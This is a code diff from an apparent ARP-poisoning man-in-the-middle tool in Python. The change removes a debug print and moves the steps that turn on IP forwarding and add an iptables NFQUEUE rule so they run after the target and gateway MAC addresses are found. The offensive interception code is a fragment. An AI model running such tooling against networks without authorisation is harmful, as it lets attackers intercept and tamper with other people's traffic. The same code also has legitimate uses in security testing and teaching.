@@ -37,7 +37,6 @@ def save_packet(packet):
 
 if args.plugin is not None:
     plugin = 'plugins.' + args.plugin
-    print(plugin)
     callback = importlib.import_module(plugin).callback
 else:
     def callback(packet):
@@ -61,12 +60,6 @@ packets         = PacketList()
 if not args.output.endswith('.pcap'):
     filename += '.pcap'
 
-print('[*] Enabling IP forwarding...')
-os.system('sysctl -w net.ipv4.ip_forward=1')
-
-print('[*] Setting up iptables...')
-os.system('iptables -t mangle -I PREROUTING -j NFQUEUE --queue-num 1')
-
 arp = ARP_attacker(target_ip, gateway_ip)
 
 if arp.target_mac is None:
@@ -82,6 +75,12 @@ if arp.gateway_mac is None:
 
 else:
     print('[+] Gateway {} is at {}'.format(arp.gateway_ip, arp.gateway_mac))
+
+print('[*] Enabling IP forwarding...')
+os.system('sysctl -w net.ipv4.ip_forward=1')
+
+print('[*] Setting up iptables...')
+os.system('iptables -t mangle -I PREROUTING -j NFQUEUE --queue-num 1')
 
 print('[*] Poisoning...')
 
